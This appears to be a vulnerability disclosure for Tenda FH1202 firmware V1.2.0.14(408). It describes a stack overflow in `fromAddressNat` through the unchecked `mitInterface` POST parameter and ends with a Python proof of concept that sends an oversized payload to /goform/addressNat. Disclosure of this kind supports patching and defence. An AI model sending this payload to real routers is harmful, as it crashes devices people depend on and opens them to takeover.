## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) firmware has a stack overflow vulnerability in the `fromAddressNat` function. The `v2` variable receives the `mitInterface` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `mitInterface` can trigger this security vulnerability.

![image-20240319225248356](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319225248356.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addressNat"
payload = b"a"*1000

data = {"mitInterface": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240319225304889](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319225304889.png)
